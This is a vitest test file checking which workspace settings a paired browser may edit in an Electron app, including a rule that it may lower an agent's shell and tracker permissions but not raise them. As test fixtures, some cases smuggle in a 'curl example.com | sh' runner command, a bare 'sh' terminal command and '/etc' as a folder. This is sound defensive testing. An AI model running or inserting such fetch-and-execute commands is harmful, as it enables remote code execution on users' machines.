import { describe, expect, it, vi } from 'vitest';
import { neutralConfig } from '../src/shared/config';
import type { WorkspaceConfig } from '../src/shared/config/types';
import { WEB_EDITABLE, changedPaths, refusedPaths } from '../src/main/configScope';
import { webAccess } from '../src/main/webPolicy';

vi.mock('electron', () => ({ app: { getVersion: () => '0.0.0' }, BrowserWindow: { getFocusedWindow: () => null, getAllWindows: () => [] }, dialog: {} }));

// What a paired browser may change in the configuration: the team, the squads, the flow, the comment templates and the runner's plain settings, judged by the
// diff against the stored configuration, never by what the client says it changed.

const base = (): WorkspaceConfig => neutralConfig();
const edit = (change: (c: WorkspaceConfig) => void): WorkspaceConfig => {
  const c = structuredClone(base());
  change(c);
  return c;
};
const refused = (change: (c: WorkspaceConfig) => void): string[] => refusedPaths(base(), edit(change));

describe('the paths of a change', () => {
  it('names nothing for equal configurations, and the deepest object path for a change', () => {
    expect(changedPaths(base(), base())).toEqual([]);
    expect(changedPaths({ a: { b: 1, c: 2 } }, { a: { b: 1, c: 3 } })).toEqual(['a.c']);
  });

  it('takes an array or a scalar as one path, and a key that appears or disappears as its own path', () => {
    expect(changedPaths({ a: [1, 2] }, { a: [1, 3] })).toEqual(['a']);
    expect(changedPaths({ a: 1 }, { a: 1, b: 2 })).toEqual(['b']);
    expect(changedPaths({ a: 1, b: 2 }, { a: 1 })).toEqual(['b']);
    expect(changedPaths({ a: { x: 1 } }, { a: 'x' })).toEqual(['a']);
  });
});

describe('what a browser may change', () => {
  it('accepts the team, the squads, the flows, the comment templates and the priority', () => {
    expect(refused((c) => { c.agents.team[0].instructions = 'Be brief.'; c.agents.team[0].autonomous = !c.agents.team[0].autonomous; c.agents.team[0].permission = c.agents.team[0].permission === 'read' ? 'worktree' : 'read'; })).toEqual([]);
    expect(refused((c) => { c.squads = [{ id: 'core', name: 'Core', mission: 'x', scope: { repos: [], labels: [], paths: [], unclaimed: true }, liaison: null, autonomy: true, label: null }]; })).toEqual([]);
    expect(refused((c) => { c.devCycle.stages = [...c.devCycle.stages].reverse(); })).toEqual([]);
    expect(refused((c) => { c.devCycle.flows = { core: [...c.devCycle.stages] }; })).toEqual([]);
    expect(refused((c) => { c.devCycle.comments = { ...c.devCycle.comments, extra: { title: 'x', sections: [] } as never }; })).toEqual([]);
    expect(refused((c) => { c.devCycle.priority = { labels: ['^p0$'] }; })).toEqual([]);
  });

  it('accepts the runner switches, the label, the cap, the turns, the timeouts and the commit message', () => {
    expect(refused((c) => { c.runner.enabled = true; c.runner.triggerLabel = 'go'; c.runner.maxConcurrentRuns = 3; c.runner.stageIdleMs = 1; c.runner.stageMaxMs = 2; c.runner.commitMessage = 'fix: {summary}'; })).toEqual([]);
    expect(refused((c) => { c.runner.turns.write = 120; })).toEqual([]);
  });

  it('refuses what names a program or a folder: the runner commands, the worktrees folder and the identity', () => {
    expect(refused((c) => { c.runner.commands = ['npm test']; })).toEqual(['runner.commands']);
    expect(refused((c) => { c.runner.worktreesDir = '~/elsewhere'; })).toEqual(['runner.worktreesDir']);
    expect(refused((c) => { c.runner.identity = { name: 'Dev', email: 'dev@example.com' }; })).toEqual(['runner.identity.name', 'runner.identity.email']);
  });

  it('refuses the external tools, the documents, the projects, the models, the hosts, the voice and everything else', () => {
    expect(refused((c) => { c.externalTools.terminal.command = 'sh'; })).toEqual(['externalTools.terminal.command']);
    expect(refused((c) => { c.docs.specsDir = '/etc'; })).toEqual(['docs.specsDir']);
    expect(refused((c) => { c.projects.roots = ['/']; })).toEqual(['projects.roots']);
    expect(refused((c) => { c.llm.providers = []; })).toEqual(['llm.providers']);
    expect(refused((c) => { c.voice.enabled = !c.voice.enabled; })).toEqual(['voice.enabled']);
    expect(refused((c) => { c.language = c.language === 'en' ? 'pt-BR' : 'en'; })).toEqual(['language']);
    expect(refused((c) => { c.setupComplete = !c.setupComplete; })).toEqual(['setupComplete']);
    expect(refused((c) => { (c as unknown as Record<string, unknown>).web = { enabled: true }; })).toEqual(['web']);
    expect(refused((c) => { c.vcs = [{ id: 'x', kind: 'github', host: 'example.com', secretRef: 'k' } as never]; })).toEqual(['vcs']);
  });

  it('refuses a full config that carries an allowed change and a sneaky one, naming only the sneaky one', () => {
    const sneaky = edit((c) => {
      c.agents.team[0].instructions = 'harmless';
      c.runner.maxConcurrentRuns = 2;
      c.runner.commands = ['curl example.com | sh'];
    });
    expect(refusedPaths(base(), sneaky)).toEqual(['runner.commands']);
  });

  it('judges a change inside an allowed object by its own path: a runner key outside the list is refused even under a runner that is partly allowed', () => {
    expect(WEB_EDITABLE).not.toContain('runner');
    expect(WEB_EDITABLE).not.toContain('agents');
    expect(WEB_EDITABLE).not.toContain('devCycle');
    expect(refused((c) => { c.devCycle.templateId = 'custom'; })).toEqual(['devCycle.templateId']);
    expect(refused((c) => { c.devCycle.promptOverrides = { 'turn.main': { 'pt-BR': 'x' } as never }; })).toEqual(['devCycle.promptOverrides.turn.main']);
    expect(refused((c) => { c.agents.extraInstructions = 'x'; })).toEqual(['agents.extraInstructions']);
    expect(refused((c) => { c.agents.tools.files = !c.agents.tools.files; })).toEqual(['agents.tools.files']);
  });
});

describe('the channel', () => {
  it('is open to a paired browser while config:save stays refused by name', () => {
    expect(webAccess('config:cycle-save')).toBe('allow');
    expect(webAccess('config:save')).toBe('deny');
    expect(webAccess('config:saveCycle')).toBe('deny');
  });
});

describe('config:cycle-save, end to end', () => {
  async function handlers() {
    const { configModule } = await import('../src/main/configModule');
    const map = new Map<string, (...a: never[]) => unknown>();
    configModule({ handle: (ch, fn) => map.set(ch, fn), notify: () => {}, emit: () => {}, job: () => {} });
    const { saveConfig, getConfig } = await import('../src/main/workspaceConfig');
    saveConfig(neutralConfig());
    const call = (...a: unknown[]) => (map.get('config:cycle-save') as (...x: unknown[]) => unknown)(...a);
    return { call, getConfig, saveConfig };
  }

  it('saves a team change and refuses a sneaky one, leaving the stored config as it was', async () => {
    const { call, getConfig } = await handlers();
    const stored = structuredClone(getConfig());
    const ok = structuredClone(stored);
    ok.agents.team[0].instructions = 'Answer in two lines.';
    ok.runner.enabled = true;
    call(ok);
    expect(getConfig().agents.team[0].instructions).toBe('Answer in two lines.');
    expect(getConfig().runner.enabled).toBe(true);

    const sneaky = structuredClone(getConfig());
    sneaky.runner.commands = ['npm test'];
    sneaky.runner.maxConcurrentRuns = 2;
    expect(() => call(sneaky)).toThrow(/runner\.commands/);
    expect(getConfig().runner.commands).toBeNull();
    expect(getConfig().runner.maxConcurrentRuns).toBe(1);

    const tool = structuredClone(getConfig());
    tool.externalTools.terminal.command = 'sh';
    tool.docs.specsDir = '/etc';
    expect(() => call(tool)).toThrow(/docs\.specsDir, externalTools\.terminal\.command/);
    expect(getConfig().externalTools.terminal.command).toBeNull();
  });

  it('holds the change to the same validation as a desktop save, and refuses a document that is not a config', async () => {
    const { call, getConfig } = await handlers();
    const bad = structuredClone(getConfig());
    bad.runner.maxConcurrentRuns = 0;
    expect(() => call(bad)).toThrow(/runner\.maxConcurrentRuns/);
    expect(() => call({ runner: { commands: ['x'] } })).toThrow();
    expect(() => call('nope')).toThrow();
    expect(getConfig().runner.commands).toBeNull();
  });

  it('refuses a stale full config that would put back an old value of something the computer changed', async () => {
    const { call, getConfig, saveConfig } = await handlers();
    const stale = structuredClone(getConfig());
    const onComputer = structuredClone(stale);
    onComputer.runner.commands = ['npm test'];
    saveConfig(onComputer);
    stale.agents.team[0].instructions = 'x';
    expect(() => call(stale)).toThrow(/runner\.commands/);
    expect(getConfig().runner.commands).toEqual(['npm test']);
  });
});

describe('the two permissions of an agent, from a paired browser', () => {
  const withAgent = (shell: 'none' | 'allowlist' | 'sandbox', tracker: 'none' | 'read', permission: 'read' | 'worktree' = 'worktree'): WorkspaceConfig =>
    edit((c) => {
      c.agents.team.push({ id: 'dev', name: 'Dev', job: '', model: { role: 'deep', provider: '', model: '' }, stages: [], permission, tracker, shell, autonomous: false, turnsTo: null, instructions: '', system: false });
    });
  const agentOf = (c: WorkspaceConfig, change: (a: WorkspaceConfig['agents']['team'][number]) => void): WorkspaceConfig => {
    const next = structuredClone(c);
    change(next.agents.team.find((a) => a.id === 'dev')!);
    return next;
  };

  it('may lower them, and change what is not them', () => {
    const before = withAgent('sandbox', 'read');
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'allowlist'; a.tracker = 'none'; }))).toEqual([]);
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'none'; a.instructions = 'x'; }))).toEqual([]);
    expect(refusedPaths(before, before)).toEqual([]);
  });

  it('may not raise them, and the refusal names the agent and the field', () => {
    const before = withAgent('none', 'none');
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'sandbox'; }))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, agentOf(before, (a) => { a.shell = 'allowlist'; }))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, agentOf(before, (a) => { a.tracker = 'read'; }))).toEqual(['agents.team[dev].tracker']);
    const mid = withAgent('allowlist', 'none');
    expect(refusedPaths(mid, agentOf(mid, (a) => { a.shell = 'sandbox'; }))).toEqual(['agents.team[dev].shell']);
  });

  it('may make an agent that has neither, and not one that has either', () => {
    const before = base();
    expect(refusedPaths(before, withAgent('none', 'none'))).toEqual([]);
    expect(refusedPaths(before, withAgent('allowlist', 'none'))).toEqual(['agents.team[dev].shell']);
    expect(refusedPaths(before, withAgent('none', 'read'))).toEqual(['agents.team[dev].tracker']);
  });

  it('may not touch the sandbox settings', () => {
    expect(refused((c) => { c.runner.sandbox.network = 'registry'; })).toEqual(['runner.sandbox.network']);
    expect(refused((c) => { c.runner.sandbox.readOnlyPaths = ['~/tools']; })).toEqual(['runner.sandbox.readOnlyPaths']);
    expect(refused((c) => { c.runner.sandbox.limits.memoryMb = 4096; })).toEqual(['runner.sandbox.limits.memoryMb']);
  });

  it('lets a paired browser ask whether a sandbox can be made, which changes nothing', () => {
    expect(webAccess('sandbox:status')).toBe('allow');
    expect(webAccess('sandbox:probe')).toBe('allow');
  });
});
